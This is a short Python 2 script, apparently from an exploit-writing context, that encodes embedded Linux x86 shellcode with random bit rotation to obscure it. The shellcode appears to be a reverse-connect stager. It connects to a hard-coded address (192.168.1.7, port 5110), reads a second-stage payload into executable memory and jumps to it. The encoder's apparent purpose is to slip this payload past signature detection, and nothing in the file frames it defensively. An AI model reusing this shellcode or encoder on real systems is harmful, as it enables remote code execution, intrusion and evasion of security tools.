#########################################################################
#Author		: DaBDouB-MoSiKaR					#
#Desc		: ShellCode Encoder					#
#Name		: Lekhchaf						#
#########################################################################
#!/usr/bin/python

from random import randint

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

shellcode = ("\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x01\x07\x68\x02\x00\x13\xf6\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80")

encoded = ""
encoded2 = ""

hobaspirit = randint(1,7)
max_bits = 8

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
	fhamator = rol(x, hobaspirit, max_bits)
    	#print fhamator
	if fhamator >= 200:
		fhamator = 56 - (255 - fhamator)
	else:
		fhamator += 55
    	encoded += '\\x'
    	encoded += '%02x' %fhamator
    	encoded2 += '0x'
    	encoded2 += '%02x,' %fhamator
        

print "Lekhchaf Number : " + str(hobaspirit)
print 'Len: %d' % len(bytearray(shellcode))

print encoded

print encoded2

 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
